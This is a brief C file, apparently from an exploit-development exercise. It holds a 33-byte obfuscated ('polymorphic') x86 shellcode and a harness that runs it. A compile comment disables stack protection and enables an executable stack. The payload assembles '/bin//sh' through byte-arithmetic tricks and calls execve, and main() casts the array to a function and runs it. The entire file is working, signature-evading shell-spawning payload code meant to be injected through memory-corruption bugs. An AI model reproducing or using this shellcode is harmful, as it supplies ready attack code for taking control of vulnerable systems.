#include<stdio.h>
#include<string.h>

/* 
Compilation: gcc -fno-stack-protector -z execstack shellcode3-poly.c -o shellcode3-poly
*/

unsigned char shellcode[] = \

"\x31\xc0\x50\x66\x68\x73\x46\x66\x68\x2f\x2f\x66\x83\x44\x24\x03\x22\x68\x2f\x62\x69\x4c\x80\x44\x24\x03\x22\x87\xdc\xb0\x0b\xcd\x80";

main()
{
	
	printf("Shellcode length: %d\n",strlen(shellcode));

	int (*ret)() = (int(*)())shellcode;

	ret();
	
}
